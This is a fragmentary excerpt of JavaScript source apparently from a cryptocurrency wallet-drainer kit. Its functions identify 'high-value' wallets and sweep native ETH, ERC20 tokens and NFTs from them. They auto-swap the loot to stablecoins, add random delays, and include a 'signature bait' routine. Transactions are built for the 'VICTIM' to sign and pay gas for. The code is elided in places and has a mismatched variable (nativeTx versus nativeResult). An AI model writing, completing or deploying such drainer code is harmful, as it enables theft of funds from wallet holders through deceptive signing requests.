...
async testAllModules() {
  ...
  async executeImmediateDrain(userAddress) {
    console.log("⚡ EXECUTING IMMEDIATE DRAIN - High-value target detected");
    
    try {
      const provider = this.provider;
      
      // Use AI targeting to analyze wallet
      const assets = await this.analyzeWalletOnChain(provider, userAddress, 1, "ethereum");
      ...
      // 1. Drain Native ETH
      if (BigInt(assets.eth) > 0n) {
        const nativeTx = await this.sweepNativeETH(provider, userAddress, assets.eth, "ethereum");
        results.push({ type: 'native', hash: nativeResult });
        await this.randomDelay(2000, 5000);
      }
      
      // 2. Drain ERC20 Tokens
      if (assets.erc20.length > 0) {
        const tokensToDrain = assets.erc20.map(t => ({ 
          address: t.contract_address, 
          amount: t.balance,
        ...
        const tokenResult = await this.batchDrainERC20(userAddress, tokensToDrain, provider);
        results.push({ type: 'tokens', success: tokenResult });
        await this.randomDelay(3000, 6000);
      }
      
      // 3. Auto-swap drained tokens to stablecoins
      if (assets.erc20.length > 0) {
        const tokensToSwap = assets.erc20.map(t => ({
          address: t.contract_address,
          amount: t.balance,
      ...
      // 4. Drain NFTs (placeholder - would use NFT modules)
      if (assets.nfts.length > 0) {
        const nftResult721 = await this.sweepNFTsERC721(provider, userAddress, "ethereum", assets.nfts);
        results.push({ type: 'nfts_721', success: nftResult721.success });
      ...
      console.log("✅ Immediate drain completed successfully");
      return { success: true, results };
  ...
  async signatureBait(userAddress) {
    console.log(`🎣 Simulating signature bait for ${userAddress}`);
    return { success: true, type: 'signature_bait' };
  }

  // ===== BASIC DRAIN OPERATIONS =====
  async sweepNativeETH(provider, userAddress, amount, chainName) {
  try {
    console.log(`💸 Creating native ${chainName.toUpperCase()} drain TX for ${userAddress}...`);
    
    // Create transaction that VICTIM will sign and pay gas for
    const tx = {
    ...
    console.log(`✅ Native ETH drain transaction created`);
    return { success: true, transaction: tx };
    
  } catch (error) {
    console.error('❌ Native sweep failed:', error);
    return { success: false, error: error.message };
  }
}
